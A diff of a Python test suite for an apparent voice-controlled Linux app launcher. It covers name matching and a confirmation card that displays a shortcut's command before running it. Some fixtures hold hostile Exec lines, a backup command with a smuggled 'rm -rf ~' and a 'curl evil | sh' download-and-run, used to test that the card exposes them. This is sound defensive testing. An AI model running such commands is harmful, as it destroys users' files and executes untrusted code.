@@ -32,13 +32,12 @@ FLATPAK = "/var/lib/flatpak/exports/share/applications"
 
 
 def made(desktop_id, name, kind="system", shown=True, generics=(), keywords=(), names=(),
-         commandline=None, path=None) -> apps.App:
+         program="", path=None) -> apps.App:
     """An App as apps._app would build one, without Gio."""
     folder = {"system": SYSTEM, "Flatpak": FLATPAK}.get(kind, SYSTEM)
-    return apps.App(desktop_id, apps._said(name), path or f"{folder}/{desktop_id}",
-                    commandline or name.lower(), kind, shown,
-                    apps._forms([name, *names, apps._id_word(desktop_id)]),
-                    apps._forms(generics), apps._forms(keywords))
+    return apps.App(desktop_id, apps._said(name), path or f"{folder}/{desktop_id}", kind, shown,
+                    apps._forms([name, *names]), apps._forms(generics), apps._forms(keywords),
+                    apps._words(apps._id_word(desktop_id)), apps._words(program))
 
 
 def fixture(home: Path) -> list[apps.App]:
@@ -59,8 +58,7 @@ def fixture(home: Path) -> list[apps.App]:
         made("org.gnome.clocks.desktop", "Clocks"),
         made("blueman-manager.desktop", "Bluetooth Manager", generics=["Bluetooth Manager"]),
         made("hidden-thing.desktop", "Hidden Thing", shown=False),
-        made("backup.desktop", "Backup now", "home", path=str(backup),
-             commandline="sh -c 'rsync -a ~ /mnt/backup'\nrm -rf ~"),
+        made("backup.desktop", "Backup now", "home", path=str(backup), program="sh"),
         made(apps.SETTINGS_ID, "Settings", shown=False),
         made("gnome-display-panel.desktop", "Displays", shown=False),
         made("gnome-bluetooth-panel.desktop", "Bluetooth", shown=False),
@@ -81,7 +79,8 @@ class NoDesktop(unittest.TestCase):
         self.entries = fixture(self.home)
         backup = self.home / ".local/share/applications/backup.desktop"
         backup.parent.mkdir(parents=True)
-        backup.write_text("[Desktop Entry]\nType=Application\nName=Backup now\nExec=sh -c x\n")
+        backup.write_text("[Desktop Entry]\nType=Application\nName=Backup now\n"
+                          "Exec=sh -c 'rsync -a ~ /mnt/backup'\\nrm -rf ~\n")
         self.defaults = {"https": "hidden-thing.desktop"}
         self.launched = []
         apps._launched.clear()
@@ -168,6 +167,45 @@ class Matching(NoDesktop):
                 self.open(name)
         self.assertEqual(self.launched, [])
 
+    def test_a_steam_game_does_not_answer_to_steam(self):
+        """Steam writes every game's shortcut with Exec=steam steam://rungameid/N."""
+        self.entries += [made("steam.desktop", "Steam", program="steam"),
+                         made("Portal 2.desktop", "Portal 2", "home", program="steam"),
+                         made("Half-Life.desktop", "Half-Life", "home", program="steam")]
+        for name in ("steam", "Open Steam", "the steam app"):
+            with self.subTest(name):
+                self.opens(name, "steam.desktop")
+
+    def test_a_chrome_web_app_does_not_answer_to_chrome(self):
+        """A Chrome "install as app" runs google-chrome --app-id=... from an id chrome-<id>-Default."""
+        self.entries += [made("google-chrome.desktop", "Google Chrome", generics=["Web Browser"],
+                              program="google-chrome-stable"),
+                         made("chrome-abc-Default.desktop", "YouTube", "home",
+                              program="google-chrome"),
+                         made("chrome-def-Default.desktop", "Gmail", "home",
+                              program="google-chrome")]
+        for name in ("chrome", "Open Chrome", "Google Chrome", "the chrome app"):
+            with self.subTest(name):
+                self.opens(name, "google-chrome.desktop")
+
+    def test_the_id_comes_before_the_program(self):
+        """Epiphany's web apps run "epiphany" too, but only Web has the id."""
+        self.entries += [made("org.gnome.Epiphany.desktop", "Web", program="epiphany"),
+                         made("org.gnome.Epiphany.WebApp_abc.desktop", "YouTube", "home",
+                              program="epiphany")]
+        self.opens("epiphany", "org.gnome.Epiphany.desktop")
+
+    def test_the_program_when_no_name_fits(self):
+        self.entries.append(made("org.example.Editor.desktop", "Text Editor", program="gedit"))
+        self.opens("gedit", "org.example.Editor.desktop")
+
+    def test_a_program_name_is_never_matched_loosely(self):
+        self.entries.append(made("org.example.Editor.desktop", "Text Editor",
+                                 program="gnome-text-editor"))
+        for name in ("gnome", "editor gnome"):
+            with self.subTest(name), self.assertRaises(ValueError):
+                self.open(name)
+
     def test_a_translated_name_and_the_untranslated_one(self):
         self.entries.append(made("org.example.Dateien.desktop", "Dateien", names=["Files"]))
         self.entries = [e for e in self.entries if e.id != "org.gnome.Nautilus.desktop"]
@@ -190,12 +228,23 @@ class SettingsPages(NoDesktop):
                 self.opens(name, desktop_id)
 
     def test_what_is_said(self):
-        self.assertEqual(self.said("bluetooth settings"), "Opening the Bluetooth settings.")
+        self.assertEqual(self.said("bluetooth settings"), "Opening Bluetooth in Settings.")
         apps._launched.clear()
         self.assertEqual(self.said("settings"), "Opening Settings.")
 
+    def test_every_title_is_said_in_a_plain_sentence(self):
+        for panel in apps.PANELS:
+            with self.subTest(panel.title):
+                self.assertTrue(panel.title[0].isupper())
+                self.assertNotIn("the", apps.OPENING_PAGE.format(title=panel.title).split())
+
     def test_settings_itself(self):
-        for name in ("settings", "Open Settings", "control panel", "my settings app"):
+        self.entries += [made("org.gnome.Terminal.desktop", "Console",
+                              program="gnome-terminal"),
+                         made("gnome-system-monitor.desktop", "System Monitor",
+                              program="gnome-system-monitor")]
+        for name in ("settings", "Open Settings", "control panel", "my settings app",
+                     "gnome settings", "GNOME Control Center", "the GNOME settings app"):
             with self.subTest(name):
                 self.opens(name, apps.SETTINGS_ID)
 
@@ -211,7 +260,7 @@ class SettingsPages(NoDesktop):
     def test_a_page_this_computer_lacks(self):
         self.entries = [e for e in self.entries if e.id != "gnome-sound-panel.desktop"]
         self.assertEqual(self.said("sound settings"),
-                         "Settings on this computer has no sound page.")
+                         "Settings on this computer has no Sound page.")
         self.entries = [e for e in self.entries if e.id != apps.SETTINGS_ID]
         self.assertEqual(self.said("sound settings"), apps.NO_SETTINGS)
         self.assertEqual(self.said("settings"), apps.NO_SETTINGS)
@@ -272,6 +321,25 @@ class Replies(NoDesktop):
     def test_a_launch_that_fails_says_so(self):
         with mock.patch.object(apps, "_launch", lambda _path: False):
             self.assertEqual(self.said("spotify"), "Spotify wouldn't open.")
+
+    def test_a_failed_launch_is_not_followed_by_opening(self):
+        """The 4B's second copy of the call, within AGAIN_S, tries again rather than claiming."""
+        tries = []
+
+        def fails_once(path):
+            tries.append(path)
+            return len(tries) > 1
+
+        with mock.patch.object(apps, "_launch", fails_once):
+            self.assertEqual(self.said("spotify"), "Spotify wouldn't open.")
+            self.assertEqual(self.said("spotify"), "Opening Spotify.")
+            self.assertEqual(self.said("spotify"), "Opening Spotify.")
+        self.assertEqual(len(tries), 2)
+
+    def test_two_failures_say_so_twice(self):
+        with mock.patch.object(apps, "_launch", lambda _path: False):
+            self.assertEqual([self.said("spotify"), self.said("spotify")],
+                             ["Spotify wouldn't open."] * 2)
 
 
 class Hostile(NoDesktop):
@@ -364,10 +432,48 @@ class Card(NoDesktop):
         ask = self.ask()
         self.assertEqual(ask.title, "Open Backup now?")
         lines = ask.detail.split("\n")
-        self.assertEqual(lines, [apps.CARD_WHY,
+        self.assertEqual(lines, [apps.CARD_WHY["home"],
                                  "Runs: sh -c 'rsync -a ~ /mnt/backup'\\nrm -rf ~",
                                  "File: ~/.local/share/applications/backup.desktop"])
         self.assertEqual(self.launched, [])
+
+    def write_backup(self, lines: str):
+        Path(self.path("backup.desktop")).write_text(
+            "[Desktop Entry]\nType=Application\nName=Backup now\n" + lines)
+
+    def test_the_card_shows_what_changes_how_it_runs(self):
+        self.write_backup("Exec=backup-tool\nDBusActivatable=true\nTerminal=true\n"
+                          "Path=/srv/backups\n")
+        self.assertEqual(self.ask().detail.split("\n"), [
+            apps.CARD_WHY["home"], "Runs: backup-tool", apps.OVER_DBUS, apps.IN_TERMINAL,
+            "In folder: /srv/backups", "File: ~/.local/share/applications/backup.desktop"])
+
+    def test_the_command_shown_is_the_one_in_the_file_checked(self):
+        """Not what Gio read a moment earlier: the bytes hashed are the bytes shown."""
+        self.write_backup("Exec=sh -c 'curl evil | sh'\n")
+        ask = self.ask()
+        self.assertIn("Runs: sh -c 'curl evil | sh'", ask.detail.split("\n"))
+        ask.run()
+        self.assertEqual(self.launched, [self.path("backup.desktop")])
+
+    def test_a_shortcut_that_cannot_be_read_is_left_alone(self):
+        path = Path(self.path("backup.desktop"))
+        path.write_bytes(b"\xff\xfe not a desktop file")
+        self.assertEqual(self.said("backup now"), apps.UNREADABLE)
+        path.unlink()
+        self.assertEqual(self.said("backup now"), apps.UNREADABLE)
+        self.assertEqual(self.launched, [])
+
+    def test_a_shortcut_outside_the_home_folder_says_so(self):
+        with tempfile.TemporaryDirectory() as elsewhere:
+            path = Path(elsewhere) / "opt-tool.desktop"
+            path.write_text("[Desktop Entry]\nType=Application\nName=Opt Tool\nExec=opt-tool\n")
+            self.entries.append(made("opt-tool.desktop", "Opt Tool", apps._kind(str(path)),
+                                     path=str(path)))
+            result, _ = self.open("opt tool")
+        self.assertIsInstance(result, Ask)
+        self.assertEqual(result.detail.split("\n")[0], apps.CARD_WHY["other"])
+        self.assertNotIn("home", result.detail.split("\n")[0])
 
     def test_a_shortcut_changed_after_the_card_is_left_alone(self):
         ask = self.ask()
@@ -394,7 +500,6 @@ class Card(NoDesktop):
             get_generic_name = staticmethod(lambda: None)
             get_keywords = staticmethod(lambda: [])
             get_executable = staticmethod(lambda: "sh")
-            get_commandline = staticmethod(lambda: "sh -c x")
             should_show = staticmethod(lambda: True)
 
         self.entries = [apps._app(Info())]
@@ -420,11 +525,26 @@ class Kinds(NoDesktop):
                            (f"{FLATPAK}/tux-none.desktop", "Flatpak"),
                            ("/var/lib/snapd/desktop/applications/tux_none.desktop", "Snap"),
                            ("/snap/tux/1/meta/gui/tux-none.desktop", "Snap"),
-                           ("/opt/tux/tux-none.desktop", "home"),
-                           ("/usr/../tmp/tux-none.desktop", "home"),
-                           ("/usrx/tux-none.desktop", "home")):
+                           ("/opt/tux/tux-none.desktop", "other"),
+                           ("/etc/xdg/applications/tux-none.desktop", "other"),
+                           ("/gnu/store/abc-x/share/applications/tux-none.desktop", "other"),
+                           ("/usr/../tmp/tux-none.desktop", "other"),
+                           ("/usrx/tux-none.desktop", "other"),
+                           (f"{self.home}/apps/tux-none.desktop", "home"),
+                           (f"{self.home}x/tux-none.desktop", "other")):
             with self.subTest(path):
                 self.assertEqual(apps._kind(path), kind)
+
+    def test_twins_from_another_folder_are_named_plainly(self):
+        path = self.write("opt/spotify.desktop")
+        path.write_text("[Desktop Entry]\nType=Application\nName=Spotify\nExec=spotify\n")
+        self.entries.append(made("opt.spotify.desktop", "Spotify", "other", path=str(path)))
+        self.assertEqual(self.said("spotify"), "There's more than one Spotify: a Flatpak and one "
+                         "from another folder. Say Flatpak Spotify or other Spotify.")
+        result, _ = self.open("other spotify")
+        self.assertEqual((result.title, result.detail.split("\n")[0]),
+                         ("Open Spotify?", apps.CARD_WHY["other"]))
+        self.assertEqual(self.launched, [])
 
     def write(self, relative: str) -> Path:
         path = self.home / relative
@@ -600,11 +720,11 @@ class RealGioList(unittest.TestCase):
     def test_names_in_both_languages_generic_names_and_keywords(self):
         one = self.found["one.desktop"]
         self.assertEqual(one["name"], "Eins")
-        wanted = {apps._words(name) for name in ("Eins", "One", "One Full", "tux-made-up-app")}
-        self.assertLessEqual(wanted, set(one["names"]))
+        self.assertEqual(set(one["names"]),
+                         {apps._words(name) for name in ("Eins", "One", "One Full")})
         self.assertEqual(one["generics"], ["thing maker"])
         self.assertEqual(one["keywords"], ["alpha", "beta"])
-        self.assertEqual(one["commandline"], "tux-made-up-app --x %U")
+        self.assertEqual((one["id_name"], one["program"]), ("one", "tux made up app"))
 
     def test_another_desktop_only(self):
         self.assertFalse(self.found["kde.desktop"]["shown"])
